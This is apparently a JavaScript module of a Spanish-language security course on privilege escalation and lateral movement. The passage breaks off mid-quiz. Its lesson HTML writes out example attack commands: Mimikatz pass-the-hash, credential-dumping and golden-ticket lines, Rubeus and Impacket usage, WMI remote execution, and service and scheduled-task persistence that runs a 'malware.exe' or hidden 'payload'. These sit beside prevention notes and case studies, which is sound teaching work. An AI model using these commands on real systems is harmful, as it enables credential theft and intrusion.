/* ========================================
   MODULE: ESCALAMIENTO DE PRIVILEGIOS
   ======================================== */

// Global variables for module state
let currentTopicIndex = 0;
let moduleProgress = 0;
let startTime = null;

// Module data based on info.md
const moduleData = {
    id: 'escalamiento-privilegios',
    title: 'Escalamiento de Privilegios',
    topics: [
        {
            id: 'escalamiento-horizontal',
            title: 'Escalamiento Horizontal',
            duration: 120,
            completed: false,
            subtopics: [
                'Definición y Conceptos',
                'Técnicas de Movimiento Lateral',
                'Explotación de Credenciales',
                'Persistencia en el Sistema',
                'Casos de Estudio'
            ]
        },
        {
            id: 'escalamiento-vertical',
            title: 'Escalamiento Vertical',
            duration: 135,
            completed: false,
            subtopics: [
                'Fundamentos del Escalamiento Vertical',
                'Explotación de Vulnerabilidades del Sistema',
                'Técnicas de Bypass de UAC',
                'Explotación de Servicios Privilegiados',
                'Metodologías Avanzadas'
            ]
        },
        {
            id: 'herramientas-escalamiento',
            title: 'Herramientas de Escalamiento',
            duration: 105,
            completed: false,
            subtopics: [
                'Mimikatz - Extracción de Credenciales',
                'PowerSploit - Framework PowerShell',
                'Metasploit - Módulos de Escalamiento',
                'Windows Sticky Keys - Backdoor',
                'Windows Sysinternals - Suite de Herramientas',
                'Process Injection - Técnicas de Inyección',
                'John The Ripper - Cracking de Contraseñas',
                'Cain And Abel - Recuperación de Passwords'
            ]
        }
    ]
};

// ========================================
// SISTEMA UNIVERSAL DE DIAGRAMAS - MÓDULO 6
// ========================================

const UNIVERSAL_DIAGRAM_SYSTEM = {    // Configuración de todos los diagramas del módulo - Específicos para Escalamiento de Privilegios
    diagrams: [
        { id: 'horizontal-escalation-Flow', viewBox: '0 0 900 600', topic: 1, title: 'Flujo de Escalamiento Horizontal' },
        { id: 'vertical-escalation-techniques', viewBox: '0 0 800 650', topic: 2, title: 'Técnicas de Escalamiento Vertical' },
        { id: 'tools-framework', viewBox: '0 0 900 700', topic: 3, title: 'Framework de Herramientas de Escalamiento' }
    ],
    
    // Estado del sistema
    isInitialized: false,
    fixAttempts: 0,
    maxAttempts: 5,
    isProcessing: false,
    svgCache: null,
    moduleId: 'escalamiento-privilegios',    // Inicializar sistema de diagramas - IMPLEMENTACIÓN COMPLETA DE REFERENCIA
    async init() {
        if (this.isInitialized || this.isProcessing) {
            console.log('🎯 Universal Diagram System (Escalamiento): Ya inicializado o en proceso');
            return;
        }
        
        this.isProcessing = true;
        console.log('🎯 Universal Diagram System (Escalamiento): Inicializando para módulo 6...');
        
        // Initialize Icon Fix System if available - con timeout
        if (window.IconFixSystem) {
            try {
                await Promise.race([
                    window.IconFixSystem.init(),
                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
                ]);
                console.log('✅ Icon Fix System inicializado desde Universal Diagram System (Escalamiento)');
            } catch (error) {
                console.warn('⚠️ Icon Fix System falló:', error.message);
            }
        }
        
        // Verificar disponibilidad de archivos SVG
        await this.checkSVGAvailability();
        
        // Pre-cargar SVG content
        try {
            this.svgCache = await this.loadSVGContent();
            if (this.svgCache) {
                console.log('✅ Universal Diagram System (Escalamiento): SVG content cached');
            }
        } catch (error) {
            console.warn('⚠️ Error pre-cargando SVG:', error);
        }
        
        // Ejecutar correcciones con intervalos controlados
        this.applyFixes();
        setTimeout(() => this.applyFixes(), 1000);
        setTimeout(() => this.applyFixes(), 3000);
        
        this.isInitialized = true;
        this.isProcessing = false;
    },

    // Verificar disponibilidad de archivos SVG - IMPLEMENTACIÓN DE REFERENCIA
    async checkSVGAvailability() {
        const svgPaths = [
            '../../assets/images/diagrams.svg',
            '../assets/images/diagrams.svg',
            './assets/images/diagrams.svg',
            'diagrams.svg'
        ];
        
        for (const path of svgPaths) {
            try {
                const response = await fetch(path, { method: 'HEAD' });
                if (response.ok) {
                    console.log(`✅ SVG encontrado en: ${path}`);
                    this.svgPath = path;
                    return;
                }
            } catch (error) {
                console.log(`❌ SVG no encontrado en: ${path}`);
            }
        }
        
        console.warn('⚠️ No se encontró archivo diagrams.svg en ninguna ruta, usando fallbacks');
        this.svgPath = null;
    },

    // Aplicar correcciones a todos los diagramas - IMPLEMENTACIÓN COMPLETA DE REFERENCIA
    async applyFixes() {
        if (this.isProcessing) {
            console.log('🔧 Universal Diagram System (Escalamiento): Corrección ya en proceso, saltando...');
            return;
        }
        
        this.isProcessing = true;
        this.fixAttempts++;
        
        if (this.fixAttempts > this.maxAttempts) {
            console.log('⚠️ Universal Diagram System (Escalamiento): Máximo de intentos alcanzado, aplicando respaldos...');
            this.createFallbackDiagrams();
            this.isProcessing = false;
            return;
        }
        
        console.log(`🔧 Universal Diagram System (Escalamiento): Intento ${this.fixAttempts}/${this.maxAttempts}`);
        
        try {
            const svgContent = await this.loadSVGContent();
            if (svgContent) {
                const processedCount = this.processDiagrams(svgContent);
                if (processedCount > 0) {
                    console.log(`✅ Universal Diagram System (Escalamiento): ${processedCount} diagramas procesados exitosamente`);
                }
            }
        } catch (error) {
            console.warn('⚠️ Error en applyFixes:', error);
        }
        
        this.isProcessing = false;
    },

    // Cargar contenido SVG
    async loadSVGContent() {
        if (this.svgCache) return this.svgCache;
        
        const svgPaths = [
            '../../assets/images/diagrams.svg',
            '../assets/images/diagrams.svg',
            './assets/images/diagrams.svg'
        ];
        
        for (const path of svgPaths) {
            try {
                const response = await fetch(path);
                if (response.ok) {
                    const content = await response.text();
                    this.svgCache = content;
                    return content;
                }
            } catch (error) {
                console.log(`❌ Error cargando SVG desde ${path}:`, error);
            }
        }
        
        return null;
    },

    // Procesar diagramas
    processDiagrams(svgContent) {
        let processedCount = 0;
        
        this.diagrams.forEach(diagram => {
            const elements = document.querySelectorAll(`svg use[href*="#${diagram.id}"]`);
            elements.forEach(element => {
                const svgParent = element.closest('svg');
                if (svgParent && diagram.viewBox) {
                    svgParent.setAttribute('viewBox', diagram.viewBox);
                    processedCount++;
                }
            });
        });
        
        return processedCount;
    },

    // Crear diagramas de respaldo
    createFallbackDiagrams() {
        this.diagrams.forEach(diagram => {
            const elements = document.querySelectorAll(`svg use[href*="#${diagram.id}"]`);
            elements.forEach(element => {
                const svgParent = element.closest('svg');
                if (svgParent) {
                    svgParent.innerHTML = `
                        <rect width="100%" height="100%" fill="#f8f9fa" stroke="#dee2e6" stroke-width="2" rx="8"/>
                        <text x="50%" y="50%" text-anchor="middle" dy="0.35em" fill="#6c757d" font-size="14">
                            ${diagram.title || 'Diagrama no disponible'}
                        </text>
                    `;
                    if (diagram.viewBox) {
                        svgParent.setAttribute('viewBox', diagram.viewBox);
                    }
                }
            });
        });
    }
};

// ========================================
// CONTENT DEFINITIONS
// ========================================

const topicContents = {    'escalamiento-horizontal': {
        title: 'Escalamiento Horizontal',
        content: `
            <div class="topic-header">
                <h2 class="text-center">
                    <svg class="topic-icon me-2" width="32" height="32" viewBox="0 0 100 100">
                        <use href="../../assets/images/icons.svg#icon-lateral-movement"></use>
                    </svg>
                    Escalamiento Horizontal
                </h2>
                <p class="topic-intro">
                    El escalamiento horizontal permite a un atacante moverse lateralmente a través de una red,
                    obteniendo acceso a múltiples sistemas con privilegios similares o diferentes, expandiendo
                    su presencia en el entorno comprometido.
                </p>
            </div>

            <div class="topic-content-body">
                <h3>Fundamentos del Escalamiento Horizontal</h3>                  <!-- Diagrama de Movimiento Lateral -->
                <div class="escalation-flow-diagram mb-4">
                    <h4 class="text-center mb-3">Flujo de Escalamiento Horizontal</h4>
                    <svg class="w-100" style="max-height: 500px;" viewBox="0 0 900 600">
                        <use href="../../assets/images/diagrams.svg#horizontal-escalation-flow"></use>
                    </svg>
                    <p class="text-center text-muted mt-2">
                        <small>Proceso de movimiento lateral desde el punto de entrada inicial hasta objetivos múltiples</small>
                    </p>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-definition"></use>
                        </svg>
                        Definición y Conceptos
                    </h4>
                    <p>El escalamiento horizontal, también conocido como movimiento lateral, es el proceso mediante el cual un atacante se mueve desde un sistema comprometido inicial hacia otros sistemas en la misma red, manteniendo o expandiendo su nivel de acceso.</p>
                    
                    <div class="alert alert-info">
                        <h6><i class="fas fa-lightbulb me-2 text-info"></i>Características del Escalamiento Horizontal:</h6>
                        <ul class="mb-0">
                            <li>Mantiene el mismo nivel de privilegios</li>
                            <li>Expande la superficie de ataque</li>
                            <li>Accede a diferentes recursos y datos</li>
                            <li>Establece múltiples puntos de persistencia</li>
                        </ul>                    </div>
                    
                    <div class="mt-4">
                        <h5>Escalamiento Horizontal vs Vertical:</h5>
                        <div class="row">
                            <div class="col-md-6">
                                <div class="card h-100">
                                    <div class="card-body">
                                        <h6 class="card-title"><i class="fas fa-arrows-alt-h me-2 text-primary"></i>Horizontal</h6>
                                        <ul class="list-unstyled">
                                            <li><i class="fas fa-check text-success me-2"></i>Movimiento entre sistemas</li>
                                            <li><i class="fas fa-check text-success me-2"></i>Mismo nivel de privilegios</li>
                                            <li><i class="fas fa-check text-success me-2"></i>Expansión de acceso</li>
                                            <li><i class="fas fa-check text-success me-2"></i>Múltiples objetivos</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <div class="card h-100">
                                    <div class="card-body">
                                        <h6 class="card-title"><i class="fas fa-arrows-alt-v me-2 text-success"></i>Vertical</h6>
                                        <ul class="list-unstyled">
                                            <li><i class="fas fa-check text-success me-2"></i>Mismo sistema objetivo</li>
                                            <li><i class="fas fa-check text-success me-2"></i>Elevación de privilegios</li>
                                            <li><i class="fas fa-check text-success me-2"></i>Mayor control del sistema</li>
                                            <li><i class="fas fa-check text-success me-2"></i>Acceso administrativo</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-lateral-move"></use>
                        </svg>
                        Técnicas de Movimiento Lateral
                    </h4>
                    <p>El movimiento lateral emplea diversas técnicas para propagarse a través de la red, aprovechando credenciales, vulnerabilidades y configuraciones inseguras.</p>
                    
                    <div class="mt-3">
                        <h5>Principales Técnicas de Movimiento Lateral:</h5>
                        <div class="accordion" id="lateralTechniquesAccordion">
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePassTheHash">
                                        Pass-the-Hash (PtH)
                                    </button>
                                </h2>
                                <div id="collapsePassTheHash" class="accordion-collapse collapse show" data-bs-parent="#lateralTechniquesAccordion">
                                    <div class="accordion-body">
                                        <p>Técnica que utiliza hashes de contraseñas obtenidos para autenticarse en otros sistemas sin conocer la contraseña en texto plano.</p>
                                        <div class="technique-examples">                                            <div class="example-item">
                                                <strong>Mimikatz:</strong>
                                                <code>sekurlsa::pth /user:administrator /domain:domain.com /ntlm:hash /run:cmd.exe</code>
                                                <small>Ejecuta comando con hash NTLM</small>
                                            </div>
                                            <div class="example-item">
                                                <strong>Impacket:</strong>
                                                <code>python3 psexec.py -hashes :hash administrator@target.com</code>
                                                <small>Conexión remota usando hash</small>
                                            </div>
                                        </div>                                        <div class="alert alert-warning mt-3">
                                            <i class="fas fa-shield-alt me-2 text-warning"></i>
                                            <strong>Prevención:</strong> Implementar Local Administrator Password Solution (LAPS) y deshabilitar NTLM cuando sea posible.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePassTheTicket">
                                        Pass-the-Ticket (PtT)
                                    </button>
                                </h2>
                                <div id="collapsePassTheTicket" class="accordion-collapse collapse" data-bs-parent="#lateralTechniquesAccordion">
                                    <div class="accordion-body">
                                        <p>Utiliza tickets de Kerberos obtenidos para acceder a servicios en otros sistemas de la red.</p>
                                        <div class="technique-examples">                                            <div class="example-item">
                                                <strong>Rubeus:</strong>
                                                <code>Rubeus.exe ptt /ticket:ticket.kirbi</code>
                                                <small>Inyecta ticket de Kerberos</small>
                                            </div>
                                            <div class="example-item">
                                                <strong>Mimikatz:</strong>
                                                <code>kerberos::ptt ticket.kirbi</code>
                                                <small>Pass-the-ticket con Mimikatz</small>
                                            </div>
                                        </div>
                                        <div class="kerberos-flow mt-3">
                                            <h6>Flujo de Ataque Kerberos:</h6>
                                            <div class="flow-steps">
                                                <div class="step">1. Extracción de tickets</div>
                                                <div class="arrow">→</div>
                                                <div class="step">2. Inyección de tickets</div>
                                                <div class="arrow">→</div>
                                                <div class="step">3. Acceso a servicios</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseGoldenTicket">
                                        Golden Ticket Attack
                                    </button>
                                </h2>
                                <div id="collapseGoldenTicket" class="accordion-collapse collapse" data-bs-parent="#lateralTechniquesAccordion">
                                    <div class="accordion-body">
                                        <p>Crea tickets de Kerberos TGT falsificados utilizando el hash KRBTGT para obtener acceso persistente a cualquier servicio del dominio.</p>
                                        <div class="technique-examples">                                            <div class="example-item">
                                                <strong>Mimikatz Golden Ticket:</strong>
                                                <code>kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21... /krbtgt:hash /ptt</code>
                                                <small>Genera y aplica Golden Ticket</small>
                                            </div>
                                        </div>                                        <div class="alert alert-danger mt-3">
                                            <i class="fas fa-exclamation-triangle me-2 text-danger"></i>
                                            <strong>Impacto Crítico:</strong> Proporciona acceso total y persistente a todo el dominio Active Directory.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="accordion-item">
                                <h2 class="accordion-header">
                                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseWMI">
                                        WMI (Windows Management Instrumentation)
                                    </button>
                                </h2>
                                <div id="collapseWMI" class="accordion-collapse collapse" data-bs-parent="#lateralTechniquesAccordion">
                                    <div class="accordion-body">
                                        <p>Utiliza WMI para ejecutar comandos y procesos en sistemas remotos de forma sigilosa.</p>
                                        <div class="technique-examples">                                            <div class="example-item">
                                                <strong>WMI Command Execution:</strong>
                                                <code>wmic /node:target /user:domain\\user /password:pass process call create "cmd.exe"</code>
                                                <small>Ejecución remota vía WMI</small>
                                            </div>
                                            <div class="example-item">
                                                <strong>PowerShell WMI:</strong>
                                                <code>Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe" -ComputerName target</code>
                                                <small>Ejecución con PowerShell</small>
                                            </div>
                                        </div>                                        <div class="wmi-advantages mt-3">
                                            <h6>Ventajas de WMI:</h6>
                                            <ul class="list-unstyled">
                                                <li><i class="fas fa-check text-success me-2"></i>Disponible por defecto en Windows</li>
                                                <li><i class="fas fa-check text-success me-2"></i>Difícil de detectar</li>
                                                <li><i class="fas fa-check text-success me-2"></i>No requiere instalar herramientas adicionales</li>
                                                <li><i class="fas fa-check text-success me-2"></i>Múltiples funcionalidades administrativas</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-credentials"></use>
                        </svg>
                        Explotación de Credenciales
                    </h4>
                    <p>La obtención y reutilización de credenciales es fundamental para el movimiento lateral exitoso en redes corporativas.</p>
                    
                    <div class="mt-3">
                        <h5>Fuentes de Credenciales:</h5>
                        <div class="row">                            <div class="col-md-6">
                                <div class="card h-100">
                                    <div class="card-body">
                                        <h6 class="card-title"><i class="fas fa-memory me-2 text-primary"></i>Memoria del Sistema</h6>
                                        <p class="card-text">Extracción de credenciales desde la memoria del sistema usando herramientas especializadas.</p>
                                        <div class="mt-3">
                                            <div class="mb-2">
                                                <strong>Mimikatz:</strong>
                                                <code>sekurlsa::logonpasswords</code>
                                                <small class="d-block">Extrae passwords de LSASS</small>
                                            </div>
                                            <div class="mb-2">
                                                <strong>LaZagne:</strong>
                                                <code>laZagne.exe all</code>
                                                <small class="d-block">Recupera passwords almacenados</small>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                              <div class="col-md-6">
                                <div class="card h-100">
                                    <div class="card-body">
                                        <h6 class="card-title"><i class="fas fa-database me-2 text-success"></i>Bases de Datos y Archivos</h6>
                                        <p class="card-text">Búsqueda de credenciales en archivos de configuración, bases de datos y registros.</p>
                                        <div class="mt-3">
                                            <div class="mb-2">
                                                <strong>Registry:</strong>
                                                <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code>
                                            </div>
                                            <div class="mb-2">
                                                <strong>Config Files:</strong>                                                <code>web.config, app.config, unattend.xml</code>
                                            </div>
                                            <div class="mb-2">
                                                <strong>Scripts:</strong>
                                                <code>.ps1, .bat, .vbs files</code>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        
                        <div class="row mt-3">
                            <div class="col-md-6">
                                <div class="card h-100">
                                    <div class="card-body">
                                        <h6 class="card-title"><i class="fas fa-network-wired me-2 text-warning"></i>Tráfico de Red</h6>
                                        <p class="card-text">Interceptación de credenciales en tráfico de red no cifrado o mal configurado.</p>
                                        <ul class="list-unstyled mt-3">
                                            <li><i class="fas fa-arrow-right text-warning me-2"></i>LLMNR/NBT-NS Poisoning</li>
                                            <li><i class="fas fa-arrow-right text-warning me-2"></i>SMB Relay Attacks</li>
                                            <li><i class="fas fa-arrow-right text-warning me-2"></i>Kerberoasting</li>
                                            <li><i class="fas fa-arrow-right text-warning me-2"></i>AS-REP Roasting</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                              <div class="col-md-6">
                                <div class="card h-100">
                                    <div class="card-body">                                        <h6 class="card-title"><i class="fas fa-users me-2 text-info"></i>Ingeniería Social</h6>
                                        <p class="card-text">Obtención de credenciales a través de técnicas de manipulación psicológica.</p>
                                        <ul class="list-unstyled mt-3">
                                            <li><i class="fas fa-arrow-right text-info me-2"></i>Phishing dirigido (Spear Phishing)</li>
                                            <li><i class="fas fa-arrow-right text-info me-2"></i>Pretexting telefónico</li>
                                            <li><i class="fas fa-arrow-right text-info me-2"></i>Shoulder surfing</li>
                                            <li><i class="fas fa-arrow-right text-info me-2"></i>Dumpster diving</li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-persistence"></use>
                        </svg>
                        Persistencia en el Sistema
                    </h4>
                    <p>Establecer mecanismos de persistencia es crucial para mantener el acceso a sistemas comprometidos durante el movimiento lateral.</p>
                    
                    <div class="mt-3">
                        <h5>Técnicas de Persistencia:</h5>
                        <div class="row">
                            <div class="col-md-12">
                                <div class="container-fluid">
                                    <div class="row">                                        <div class="col-md-6">
                                            <div class="card h-100">
                                                <div class="card-body">
                                                    <h6 class="card-title"><i class="fas fa-cog me-2 text-primary"></i>Servicios del Sistema</h6>
                                                    <p class="card-text">Creación o modificación de servicios de Windows para mantener acceso persistente.</p>
                                                    <div class="mt-3">
                                                        <div class="mb-2">
                                                            <strong>Crear servicio malicioso:</strong>
                                                            <code>sc create "ServiceName" binpath= "C:\\malware.exe" start= auto</code>
                                                        </div>
                                                        <div class="mb-2">
                                                            <strong>PowerShell persistente:</strong>                                                            <code>New-Service -Name "UpdateService" -BinaryPathName "powershell.exe -File C:\\script.ps1"</code>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                          <div class="col-md-6">
                                            <div class="card h-100">
                                                <div class="card-body">
                                                    <h6 class="card-title"><i class="fas fa-calendar-alt me-2 text-success"></i>Tareas Programadas</h6>
                                                    <p class="card-text">Uso del programador de tareas para ejecutar payloads en momentos específicos.</p>
                                                    <div class="persistence-examples">                                                        <div class="example-item">
                                                            <strong>Tarea programada:</strong>
                                                            <code>schtasks /create /tn "SystemUpdate" /tr "C:\\malware.exe" /sc onlogon</code>
                                                        </div>
                                                        <div class="example-item">
                                                            <strong>Tarea oculta:</strong>
                                                            <code>schtasks /create /tn "\\Microsoft\\Windows\\UpdateCheck" /tr "powershell.exe -w hidden -c payload"</code>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    
                                    <div class="row mt-3">                                        <div class="col-md-6">
                                            <div class="persistence-method">
                                                <h6><i class="fas fa-key me-2 text-warning"></i>Claves de Registro</h6>
                                                <div class="method-details">
                                                    <p>Modificación de claves de registro para ejecutar código al inicio del sistema.</p>
                                                    <div class="registry-locations">
                                                        <div class="location-item">
                                                            <strong>Run Keys:</strong>
                                                            <code>HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>
                                                        </div>
                                                        <div class="location-item">
                                                            <strong>RunOnce:</strong>
                                                            <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>
                                                        </div>
                                                        <div class="location-item">
                                                            <strong>Winlogon:</strong>
                                                            <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                          <div class="col-md-6">
                                            <div class="persistence-method">
                                                <h6><i class="fas fa-file-code me-2 text-info"></i>DLL Hijacking</h6>
                                                <div class="method-details">
                                                    <p>Colocación de DLLs maliciosas en ubicaciones donde serán cargadas por aplicaciones legítimas.</p>                                                    <div class="dll-techniques">
                                                        <ul class="list-unstyled">
                                                            <li><i class="fas fa-arrow-right text-info me-2"></i>DLL Search Order Hijacking</li>
                                                            <li><i class="fas fa-arrow-right text-info me-2"></i>DLL Side-Loading</li>
                                                            <li><i class="fas fa-arrow-right text-info me-2"></i>COM Hijacking</li>
                                                            <li><i class="fas fa-arrow-right text-info me-2"></i>AppInit DLLs</li>
                                                        </ul>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h4>
                        <svg class="concept-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-case-study"></use>
                        </svg>
                        Casos de Estudio
                    </h4>
                    <p>Análisis de casos reales de escalamiento horizontal en entornos empresariales para comprender las técnicas utilizadas y las lecciones aprendidas.</p>
                    
                    <div class="case-studies">
                        <div class="case-study-tabs">
                            <nav>
                                <div class="nav nav-tabs" id="nav-tab" role="tablist">
                                    <button class="nav-link active" id="nav-apt29-tab" data-bs-toggle="tab" data-bs-target="#nav-apt29" type="button" role="tab">APT29 - Cozy Bear</button>
                                    <button class="nav-link" id="nav-lateral-phish-tab" data-bs-toggle="tab" data-bs-target="#nav-lateral-phish" type="button" role="tab">Phishing Corporativo</button>
                                    <button class="nav-link" id="nav-domain-admin-tab" data-bs-toggle="tab" data-bs-target="#nav-domain-admin" type="button" role="tab">Compromiso de Dominio</button>
                                </div>
                            </nav>
                            <div class="tab-content" id="nav-tabContent">
                                <div class="tab-pane fade show active" id="nav-apt29" role="tabpanel">
                                    <div class="case-study-content">
                                        <h6><i class="fas fa-user-secret me-2 text-danger"></i>APT29 (Cozy Bear) - Movimiento Lateral Avanzado</h6>
                                        <div class="case-timeline">
                                            <div class="timeline-item">
                                                <div class="timeline-marker">1</div>
                                                <div class="timeline-content">
                                                    <h6>Punto de Entrada Inicial</h6>
                                                    <p>Spear phishing dirigido a personal de alto nivel con documentos maliciosos que explotan vulnerabilidades de Office.</p>
                                                </div>
                                            </div>
                                            <div class="timeline-item">
                                                <div class="timeline-marker">2</div>
                                                <div class="timeline-content">
                                                    <h6>Reconocimiento Interno</h6>
                                                    <p>Uso de herramientas living-off-the-land como PowerShell y WMI para mapear la red y identificar objetivos de alto valor.</p>
                                                </div>
                                            </div>
                                            <div class="timeline-item">
                                                <div class="timeline-marker">3</div>
                                                <div class="timeline-content">
                                                    <h6>Extracción de Credenciales</h6>
                                                    <p>Implementación de técnicas de dumping de LSASS y keylogging para obtener credenciales de administradores de dominio.</p>
                                                </div>
                                            </div>
                                            <div class="timeline-item">
                                                <div class="timeline-marker">4</div>
                                                <div class="timeline-content">
                                                    <h6>Movimiento Lateral Masivo</h6>
                                                    <p>Pass-the-hash y Pass-the-ticket para acceder a múltiples sistemas críticos incluyendo controladores de dominio.</p>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="case-lessons">
                                            <h6>Lecciones Aprendidas:</h6>
                                            <ul class="lessons-list">
                                                <li>Importancia del monitoreo de movimiento lateral</li>
                                                <li>Necesidad de segmentación de red</li>
                                                <li>Implementación de privilegios mínimos</li>
                                                <li>Detección de anomalías en autenticación</li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                <div class="tab-pane fade" id="nav-lateral-phish" role="tabpanel">
                                    <div class="case-study-content">
                                        <h6><i class="fas fa-envelope me-2 text-warning"></i>Campaña de Phishing con Movimiento Lateral</h6>
                                        <div class="attack-flow">
                                            <div class="flow-step">
                                                <div class="step-number">01</div>
                                                <div class="step-content">
                                                    <h6>Phishing Inicial</h6>
                                                    <p>Email con archivo Excel malicioso enviado a departamento financiero</p>
                                                    <div class="technical-details">
                                                        <code>Macro → PowerShell → Empire Agent</code>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="flow-arrow">↓</div>
                                            <div class="flow-step">
                                                <div class="step-number">02</div>
                                                <div class="step-content">
                                                    <h6>Credencial Harvesting</h6>
                                                    <p>Uso de Mimikatz para extraer credenciales del sistema comprometido</p>
                                                    <div class="technical-details">
                                                        <code>sekurlsa::logonpasswords full</code>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="flow-arrow">↓</div>
                                            <div class="flow-step">
                                                <div class="step-number">03</div>
                                                <div class="step-content">
                                                    <h6>Lateral Movement</h6>
                                                    <p>WMI y PsExec para acceder a servidores de archivo y bases de datos</p>
                                                    <div class="technical-details">
                                                        <code>wmic /node:target process call create</code>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="tab-pane fade" id="nav-domain-admin" role="tabpanel">
                                    <div class="case-study-content">
                                        <h6><i class="fas fa-crown me-2 text-success"></i>Compromiso Completo de Dominio Active Directory</h6>
                                        <div class="domain-compromise">
                                            <div class="compromise-phase">
                                                <h6>Fase 1: Reconocimiento de Dominio</h6>
                                                <div class="phase-activities">
                                                    <ul>
                                                        <li>Enumeración de usuarios y grupos con BloodHound</li>
                                                        <li>Identificación de cuentas de servicio con Kerberoasting</li>
                                                        <li>Mapeo de relaciones de confianza entre dominios</li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div class="compromise-phase">
                                                <h6>Fase 2: Escalamiento a Domain Admin</h6>
                                                <div class="phase-activities">
                                                    <ul>
                                                        <li>DCSync attack para obtener hash KRBTGT</li>
                                                        <li>Golden Ticket para acceso persistente</li>
                                                        <li>Compromiso de controladores de dominio</li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div class="compromise-phase">
                                                <h6>Fase 3: Persistencia y Exfiltración</h6>
                                                <div class="phase-activities">
                                                    <ul>
                                                        <li>Skeleton Key attack en controladores de dominio</li>
                                                        <li>Backdoors en múltiples sistemas críticos</li>
                                                        <li>Exfiltración masiva de datos confidenciales</li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="topic-quiz mt-4">
                    <h4>
                        <svg class="quiz-icon me-2" width="24" height="24" viewBox="0 0 100 100">
                            <use href="../../assets/images/icons.svg#icon-quiz"></use>
                        </svg>
                        Verifica tu Comprensión
                    </h4>
                    <div class="quiz-question">
                        <p><strong>¿Cuál es la principal diferencia entre escalamiento horizontal y vertical?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q1" value="a">
                                <span class="option-text">El horizontal requiere más herramientas especializadas</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q1" value="b">
                                <span class="option-text">El horizontal se mueve entre sistemas, el vertical eleva privilegios en el mismo sistema</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q1" value="c">
                                <span class="option-text">El vertical es más difícil de detectar</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q1" value="d">
                                <span class="option-text">No hay diferencia significativa entre ambos</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="quiz-question">
                        <p><strong>¿Qué técnica utiliza hashes de contraseñas para autenticarse sin conocer la contraseña en texto plano?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q2" value="a">
                                <span class="option-text">Pass-the-Ticket</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q2" value="b">
                                <span class="option-text">Pass-the-Hash</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q2" value="c">
                                <span class="option-text">Golden Ticket</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q2" value="d">
                                <span class="option-text">WMI Execution</span>
                            </label>
                        </div>
                    </div>
                    
                    <div class="quiz-question">
                        <p><strong>¿Cuál de las siguientes NO es una técnica común de persistencia?</strong></p>
                        <div class="quiz-options">
                            <label class="quiz-option">
                                <input type="radio" name="q3" value="a">
                                <span class="option-text">Servicios del sistema</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q3" value="b">
                                <span class="option-text">Tareas programadas</span>
                            </label>
                            <label class="quiz-option">
                                <input type="radio" name="q3" value="c">
                                <span class="option-text">Port scanning</span>
                            </label>
                            <label class="quiz-option">
